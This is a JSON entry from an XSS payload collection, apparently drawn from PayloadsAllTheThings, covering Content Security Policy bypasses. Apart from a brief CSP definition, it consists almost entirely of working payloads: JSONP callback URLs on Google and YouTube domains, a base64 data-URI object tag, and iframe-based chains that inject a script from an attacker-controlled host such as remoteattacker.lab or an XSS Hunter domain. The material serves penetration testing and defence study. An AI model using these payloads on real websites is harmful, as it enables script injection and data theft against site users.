{
  "id": "xss-9929c1577021",
  "category": "XSS",
  "title": "4   CSP Bypass",
  "description": "# CSP Bypass\n\n> A Content Security Policy (CSP) is a security feature that helps prevent cross-site scripting (XSS), data injection attacks, and other code-injection vulnerabilities in web applications. It works by specifying which sources of content (like scripts, styles, images, etc.) are allowed to load and execute on a webpage.\n\n## Summary\n\n- [Tools](#tools)\n- [Bypass CSP using JSONP](#bypass-csp-using-jsonp)\n- [Bypass CSP default-src](#bypass-csp-default-src)\n- [Bypass CSP inline eval](#byp",
  "payloads": [
    "- [gmsgadget.com](https://gmsgadget.com/) - GMSGadget (Give Me a Script Gadget) is a collection of JavaScript gadgets that can be used to bypass XSS mitigations such as Content Security Policy (CSP) and HTML sanitizers like DOMPurify.",
    "- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - CSP Evaluator allows developers and security experts to check if a Content Security Policy (CSP) serves as a strong mitigation against cross-site scripting attacks.",
    "- CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`",
    "- Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`",
    "- Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`",
    "- Youtube: `https://www.youtube.com/oembed?callback=alert;`",
    "- [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)",
    "<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>\"",
    "`http://example.lab/csp.php?xss=f=document.createElement%28\"iframe\"%29;f.id=\"pwn\";f.src=\"/robots.txt\";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`",
    "Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)",
    "d=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[YOUR_XSSHUNTER_USERNAME].xss.ht\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)",
    "Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    "Source: [@akita_zen](https://twitter.com/akita_zen)",
    "- CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)."
  ],
  "references": [
    "PayloadsAllTheThings/XSS Injection/4 - CSP Bypass.md"
  ],
  "source": "PayloadsAllTheThings"
}